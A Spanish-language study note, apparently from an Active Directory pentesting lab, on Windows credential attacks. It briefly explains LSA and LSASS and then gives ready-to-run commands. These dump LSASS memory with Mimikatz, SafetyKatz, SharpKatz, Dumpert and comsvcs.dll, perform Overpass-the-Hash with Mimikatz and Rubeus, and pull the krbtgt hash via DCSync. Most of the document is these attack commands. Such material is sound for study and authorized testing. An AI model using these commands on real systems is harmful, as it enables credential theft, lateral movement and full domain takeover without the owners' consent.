## LSA y LSASS
La **Autoridad de Seguridad Local (LSA)** es un componente clave del subsistema de seguridad de Windows, responsable de aplicar las políticas de seguridad, gestionar la autenticación y almacenar datos confidenciales como credenciales de usuario y tokens de seguridad. Desempeña un papel fundamental en el procesamiento de solicitudes de autenticación, la verificación de identidades de usuario y la interacción con Active Directory en entornos de dominio.

El **Servicio de Subsistema de Autoridad de Seguridad Local (LSASS)** es el proceso `lsass.exe`que ejecuta LSA en modo usuario. Se encarga de autenticar usuarios, gestionar tokens de acceso y almacenar hashes de credenciales en memoria. Debido a su función crítica, LSASS es un objetivo de alto valor para los atacantes que buscan extraer credenciales, realizar ataques de robo de hash o manipular mecanismos de autenticación. Proteger LSASS es fundamental para mantener la seguridad del sistema, por lo que las versiones modernas de Windows implementan protecciones como Credential Guard y restricciones de memoria para LSASS.

## Extracción de credenciales de LSASS
> Se necesita acceso de administrador en una maquina

### Mimikatz
Para extraer por ejemplo el has NTLM de LSASS en una maquina local usando `Invoke-Mimikatz` hace falta ejecutar:
```shell
Invoke-Mimikatz -Command "sekurlsa::ekeys"
```

El comando ejecuta *Mimikatz* usando la opción de `-Command` para interactuar con el proceso de *LSASS* a través de `sekurlsa` que es donde Windows guarda las credenciales en memoria y usa `ekeys` para extraer las claves de cifrado de Kerberos de las sesiones activas

También se puede ejecutar con 
### SafetyKatz
```shell
SafetyKatz.exe "sekurlsa::ekeys"
```

### SharpKatz
```shell
SharpKatz.exe --Command ekeys
```

### Dumpert
```shell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

### Comsvcs.dll
```shell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dmp full
```

Después de obtener unas credenciales con cualquiera de las herramientas y variables podemos usar *Pass-the-Hash / Pass-the-Ticket / OverPass-the-Hash*

Para realizar **OverPass-The-Hash (OPTH)** primero hay que entenderlo, este ataque permite a los atacantes generar tokens de autenticación a través de hashes NTLM o claves Kerberos. Requiere de permisos de administrador mediante *Mimikatz/Safety-Katz* pero en cambio no requiere de elevación de privilegios si se hace mediante *Rubeus*

En el caso de *Pass-the-Hash* es necesario leer el hash NTLM y usarlo para autenticarse utilizando las credenciales de los usuarios locales de la maquina, mientras que con *OPTH* utiliza una clave NTLM o AES para obtener el TGT Kerberos y autenticarse en el sistema utilizando las credenciales para los usuarios del dominio (Normalmente iniciando una nueva sesión en PowerShell)

## OPTH
### Mimikatz
**Usando cifrado AES245**
```shell
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"
```

### SafetyKatz
```shell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe"
```

Iniciando una sesión de PowerShell de tipo 9 equivalente a `runas /netonly`

### Rubeus
**Centrado en Kerberos**
Usando hashes NTLM (No requiere elevación de privilegios)
```shell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

Usando claves AES256 (Requiriendo elevación de privilegios)
```shell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## DCSync (Extracción de credenciales del controlador de dominio)
Este tipo de ataque permite extraer hashes de contraseñas de un controlador de dominio sin ejecutar código en el

### Mimikatz
**Extracción del hash krbtgt** para obtener este hash usando *DCSync* (Se requieren de privilegios de Domain Admin)
```shell
Invoke-Mimikatz -Command "lsadump::dcsync /user:us\krbtgt"
```

### SafetyKatz
```shell
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt"
```

Se suele requiere por defecto privilegios de Domain Admin, Enterprise Admin o Domain Controller para poderlo ejecutar
